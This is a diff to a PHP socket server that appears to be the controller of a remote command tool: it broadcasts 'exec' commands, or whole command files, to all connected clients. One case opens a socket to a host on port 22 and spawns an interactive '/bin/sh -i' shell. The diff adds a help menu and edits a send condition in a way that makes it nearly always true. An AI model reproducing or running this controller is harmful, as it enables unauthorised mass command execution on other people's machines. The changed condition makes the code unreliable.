@@ -90,7 +90,6 @@
 	            unset($recv[$key]);
 	            unset($write[$key]);
 	            unset($cstm[$_key]); 	// u realnom okruzenju - IP umjesto porta
-	            
 
 	            echo "[".$now."] \33[38;5;208mClient ".$ip.":".$port." disconnected.\33[0m\n";
 	            continue;
@@ -104,7 +103,7 @@
     	   	// $clients minus master socket
 	    	// $cstm = array of connected clients (ip:port)
 			// $line needs to be flushed => line=exec until data is recieved back
-			// empty $line when data is recieved from all clients
+			// flush $line when data is recieved from all clients
 
 		    if(count($cstm) == count($clients)-1)
 		    	$line = "";	
@@ -126,7 +125,7 @@
     		$cnt = 0;
     	}
 	
-		// reading a file of commands
+		// reading/sending a file of commands
 		if(preg_match('/^exec\s[\-f]*\s[\.{0,2}\/]*\w*\.\w{2,3}$/', $line))
 		{
 			$file = substr($line, 8);
@@ -157,8 +156,6 @@
 				echo "Invalid path.\n";
 				continue;
 			}
-
-			print_r($cmdsarr);
 		}
 
 	    switch ($line) {
@@ -174,6 +171,9 @@
 				$sock = fsockopen("$host_addr", 22);
 				exec("/bin/sh -i >> ./shellout.txt");
 				break;
+			case 'options':
+				echo options();
+				break;
 	    	default:
 	    		break;
 	    }
@@ -186,7 +186,7 @@
 		}
 		if(!empty($cstm) && !empty($write))
 		{
-		    if(!empty($line) && $line != 'clients' && $line != 'exit')
+		    if(!empty($line) && $line != 'clients' && $line != 'exit' || $line != 'options')
 		    {
 			  	foreach ($write as $send_sock)
 			  	{
@@ -205,4 +205,15 @@
 	echo "Closing master socket..\n";
 	socket_close($master_sock);
 	exit(0);
+
+
+
+	/*******************************************/
+	/*******************************************/
+	/*******************************************/
+
+
+	function options(){
+		return "<clients>\t\t\t- display connected clients\n<dc>\t\t\t\t- disconnect all clients\n<exit>\t\t\t\t- exit script\n<exec> <cmd>\t\t\t- execute command\n<exec> <-f> <path>\t\t- execute from file\n";
+	}
 ?>
